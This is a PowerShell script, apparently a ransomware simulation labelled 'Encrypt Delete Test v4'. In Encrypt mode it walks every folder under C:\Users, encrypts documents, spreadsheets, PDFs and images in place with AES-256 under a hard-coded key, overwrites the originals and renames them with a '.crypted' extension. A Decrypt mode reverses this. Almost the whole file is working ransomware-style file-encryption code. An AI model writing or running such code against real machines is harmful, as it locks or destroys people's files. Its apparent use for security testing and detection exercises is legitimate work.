# Run with Set-ExecutionPolicy -Scope CurrentUser -ExecutionPolicy RemoteSigned

$global:processedfile=0;
$Key = 'enctest@123'
$shaManaged = New-Object System.Security.Cryptography.SHA256Managed
$aesManaged = New-Object System.Security.Cryptography.AesManaged
$aesManaged.Mode = [System.Security.Cryptography.CipherMode]::CBC
$aesManaged.Padding = [System.Security.Cryptography.PaddingMode]::Zeros
$aesManaged.BlockSize = 128
$aesManaged.KeySize = 256
$aesManaged.Key = $shaManaged.ComputeHash([System.Text.Encoding]::UTF8.GetBytes($Key))
#$aesManaged.Key = $Key
$encryptor = $aesManaged.CreateEncryptor()

$targetPath = "C:\\Users"
$action = "Decrypt"  # Change this to Encrypt or Decrypt

Function EncryptFile($File){
  $plainBytes = [System.IO.File]::ReadAllBytes($File)
  $outPath = $File + ".crypted"

  $encryptedBytes = $encryptor.TransformFinalBlock($plainBytes, 0, $plainBytes.Length)
  $encryptedBytes = $aesManaged.IV + $encryptedBytes

  [System.IO.File]::WriteAllBytes($File, $encryptedBytes)
  Write-Host "Encrypt and overwrite to $File"
  Rename-Item $File $outPath
  Write-Host "Rename to $outPath"
  Write-Host
  if ([System.IO.File]::Exists($outPath)) {
    $global:processedfile += 1
  }

}

Function DecryptFile($File){
  $cipherBytes = [System.IO.File]::ReadAllBytes($File)
  $outPath = $File -replace ".crypted"

  $aesManaged.IV = $cipherBytes[0..15]
  $decryptor = $aesManaged.CreateDecryptor()
  $decryptedBytes = $decryptor.TransformFinalBlock($cipherBytes, 16, $cipherBytes.Length - 16)

  [System.IO.File]::WriteAllBytes($outPath, $decryptedBytes)
  Write-Host "Decrypt to $outPath"
  Write-Host
}

Function Banner{

  Write-Host ""
  Write-Host "Encryption Key: " $Key
  Write-Host "Encrypted File: " $global:processedfile
  Write-Host ""
  Write-Host "Operation completed!"
}


 
if ($action -eq "Encrypt"){
Write-Host 'encrypt'

Get-ChildItem $targetPath -Recurse -Attributes !Directory -Include *.doc,*.docx,*.xls,*.xlsx,*.txt,*.rtf,*.pdf,*.jpg,*.jpeg,*.gif,*.bmp,*.png | % {EncryptFile $_.FullName}
Banner    

}

elseif ($action -eq "Decrypt"){

    Write-Host 'Decrypt'
    Get-ChildItem $targetPath -Recurse -Attributes !Directory -Include *.crypted | % {DecryptFile $_.FullName}
    Write-Host "Operation completed!"
}
Else{
[System.Windows.Forms.MessageBox]::Show('Please select option',"[Encrypt Delete Test v4]",[System.Windows.Forms.MessageBoxButtons]::OK,[System.Windows.Forms.MessageBoxIcon]::Warning)
} 
